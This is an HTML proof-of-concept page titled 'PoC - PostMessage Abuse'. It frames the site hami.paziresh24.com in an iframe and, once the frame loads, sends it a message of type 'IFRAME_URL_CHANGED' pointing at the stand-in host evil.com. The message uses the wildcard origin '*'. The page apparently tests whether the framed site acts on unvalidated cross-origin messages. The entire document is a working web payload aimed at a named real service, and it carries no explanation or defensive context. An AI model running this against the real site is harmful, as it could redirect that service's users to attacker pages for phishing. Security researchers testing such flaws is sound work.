<!DOCTYPE html>
<html>
<head>
    <title>PoC - PostMessage Abuse</title>
</head>
<body>
    <iframe src="https://hami.paziresh24.com" width="100%" height="500"></iframe>
    <script>
        const iframe = document.querySelector('iframe');

        iframe.onload = function () {
            iframe.contentWindow.postMessage({
                type: 'IFRAME_URL_CHANGED',
                url: 'https://evil.com'
            }, '*');
        };

        window.addEventListener('message', function (e) {
            if (e.data && e.data.type === 'IFRAME_URL_CHANGED') {
                console.log('URL changed to:', e.data.url);
            }
        });
    </script>
</body>
</html>
